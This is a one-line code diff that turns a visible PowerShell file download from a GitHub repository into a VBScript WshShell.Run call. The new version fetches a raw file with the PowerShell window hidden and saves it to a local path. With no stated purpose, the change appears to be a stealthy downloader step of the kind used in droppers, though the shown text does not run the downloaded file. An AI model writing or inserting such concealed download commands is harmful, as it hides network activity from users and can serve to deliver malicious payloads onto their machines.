@@ -1,1 +1,1 @@
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/butterscotch6969/serving_url/blob/main/test.txt' -OutFile 'filename.txt'" 
+WshShell.Run "powershell -WindowStyle Hidden -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/butterscotch6969/serving_url/main/test.txt' -OutFile 'C:\Path\To\filename.txt'""", 0
